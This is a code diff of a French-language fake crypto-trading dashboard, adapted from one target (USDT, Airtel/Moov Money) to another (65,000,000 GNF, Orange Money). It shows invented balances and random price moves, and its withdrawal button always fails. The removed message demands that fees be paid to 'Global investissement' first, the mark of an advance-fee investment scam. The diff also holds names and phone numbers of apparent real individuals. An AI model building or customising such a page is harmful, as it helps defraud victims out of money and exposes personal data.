@@ -12,6 +12,7 @@
             padding: 0;
             background-color: #0b0e11;
             color: #c9d1d9;
+            display: none;
         }
 
         header {
@@ -143,7 +144,7 @@
 
         .withdrawal-options {
             display: flex;
-            justify-content: space-between;
+            justify-content: center;
             margin-top: 20px;
             width: 100%;
         }
@@ -155,7 +156,7 @@
             cursor: pointer;
             color: #21262d;
             font-weight: bold;
-            width: 48%;
+            width: 100%;
             border-radius: 5px;
         }
 
@@ -230,7 +231,7 @@
 <body>
     <script>
         let code = prompt("Veuillez entrer le code d'accès :");
-        if (code === "2120") {
+        if (code === "2020") {
             document.body.style.display = 'block';
         } else {
             alert("Code incorrect. Accès refusé.");
@@ -244,10 +245,10 @@
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde: 32 101,000 USDT</span>
+                <span class="balance">Solde: 65 000 000 GNF</span>
                 <div class="account-info">
-                    <span>ANTSOULOU MAGLOIRE</span><br>
-                    <span>24177147833</span>
+                    <span id="user-name">Sacko Mohamed Fode</span><br>
+                    <span id="user-phone">224 6 21 33 58 88</span>
                 </div>
                 <button>Déconnexion</button>
             </div>
@@ -274,8 +275,7 @@
                 </div>
             </div>
             <div class="withdrawal-options">
-                <button id="airtel">Retrait via Airtel Money</button>
-                <button id="moov">Retrait via Moov Money</button>
+                <button id="orange-money">Retrait via Orange Money</button>
             </div>
             <div class="withdrawal-form" id="withdrawal-form">
                 <h3>Confirmer le retrait</h3>
@@ -301,52 +301,39 @@
                 const newVariation = (Math.random() * (2) - 1).toFixed(2);
                 priceElement.textContent = newPrice;
                 variationElement.textContent = `${newVariation}%`;
-                variationElement.style.color = newVariation > 0 ? 'green' : 'red';
             };
 
             setInterval(updatePrice, 5000);
 
-            const showWithdrawalForm = (method) => {
-                let withdrawalDetails = `<p>Nom: ANTSOULOU MAGLOIRE</p><p>Numéro: 24177147833</p><p>Montant: 32 101,000 USDT</p>`;
-                if (method === 'Airtel Money') {
-                    withdrawalDetails = `<p>Nom: ANTSOULOU MAGLOIRE</p><p>Numéro: 24177147833</p><p>Montant: 32 101,000 USDT</p>`;
-                } else if (method === 'Moov Money') {
-                    withdrawalDetails = `<p>Nom: ANTSOULOU MAGLOIRE</p><p>Numéro: 24174509691</p><p>Montant: 32 101,000 USDT</p>`;
-                }
-                withdrawalInfo.innerHTML = withdrawalDetails;
+            const setWithdrawalInfo = () => {
+                const paymentMethod = "Orange Money";
+                const accountName = "Sacko Mohamed Fode";
+                const accountNumber = "224 6 21 33 58 88";
+                withdrawalInfo.innerHTML = `Vous avez choisi de retirer via ${paymentMethod}.<br>Nom du compte: ${accountName}.<br>Numéro du compte: ${accountNumber}.<br>Montant: 65 000 000 GNF.`;
                 withdrawalForm.style.display = 'flex';
-                errorMessage.textContent = '';
             };
 
-            document.getElementById('airtel').addEventListener('click', () => showWithdrawalForm('Airtel Money'));
-            document.getElementById('moov').addEventListener('click', () => showWithdrawalForm('Moov Money'));
+            document.getElementById('orange-money').addEventListener('click', setWithdrawalInfo);
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                errorMessage.textContent = 'Erreur : Veuillez régler vos frais aupres de Global investissement pour entrer en possession de vos bénéfices.';
+                alert('Erreur : la liaison avec votre compte Orange Money n\'a pas été effectuée.');
                 withdrawalForm.style.display = 'none';
             });
 
+            // Ensure the TradingView chart is displayed
             new TradingView.widget({
-                "container_id": "tradingview_chart",
-                "width": "100%",
-                "height": "400px",
-                "symbol": "BINANCE:BTCUSDT",
-                "interval": "D",
-                "timezone": "Etc/UTC",
-                "theme": "dark",
-                "style": "1",
-                "locale": "fr",
-                "toolbar_bg": "#f1f3f6",
-                "enable_publishing": false,
-                "hide_legend": false,
-                "save_image": false,
-                "details": true,
-                "studies": [
-                    "MACD@tv-basicstudies"
-                ],
-                "show_popup_button": true,
-                "popup_width": "1000",
-                "popup_height": "650"
+                container_id: "tradingview_chart",
+                autosize: true,
+                symbol: "BINANCE:BTCUSDT",
+                interval: "D",
+                timezone: "Etc/UTC",
+                theme: "dark",
+                style: "1",
+                locale: "fr",
+                toolbar_bg: "#f1f3f6",
+                enable_publishing: false,
+                allow_symbol_change: true,
+                hideideas: true
             });
         });
     </script>
